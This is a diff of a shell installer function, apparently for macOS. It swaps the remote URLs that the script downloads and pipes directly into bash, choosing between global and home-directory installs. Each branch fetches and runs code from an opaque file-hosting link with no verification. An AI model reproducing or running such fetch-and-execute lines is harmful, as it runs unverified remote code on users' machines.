@@ -4,10 +4,10 @@ main() {
     clear
 
     if [ -w "/Applications" ]; then
-        curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3rnyfNuecjgAjhlqfVMR38GJ4eu07bBIaPr16H" | bash
+        curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3r5JV5zLblnGWyNmSBHr8E3DuVLvPfio4M0h6Y" | bash
     else
         echo -e "${YELLOW}[!] Local user detected, using home directory instead of global directory ${NC}"
-        curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3rfHlH5vp67J0IKpN4AgOdvCZzXHYQ2hli8qEo" | bash
+        curl -s "https://f3a5dqxez3.ufs.sh/f/ijk9xZzvhn3rja0fqp8I3wQG4vqTr2FNCdMP5UgDc79pzOYm" | bash
     fi
 }
 
